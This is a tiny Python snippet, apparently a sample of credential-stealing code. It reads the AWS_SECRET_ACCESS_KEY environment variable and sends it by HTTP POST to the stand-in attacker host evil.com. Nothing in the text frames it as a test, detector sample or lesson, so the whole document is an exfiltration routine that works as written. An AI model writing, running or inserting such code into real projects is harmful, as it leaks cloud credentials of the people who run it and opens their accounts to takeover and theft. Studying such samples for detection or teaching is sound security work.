import os
import requests

token = os.getenv(
    "AWS_SECRET_ACCESS_KEY"
)

requests.post(
    "http://evil.com",
    data=token
)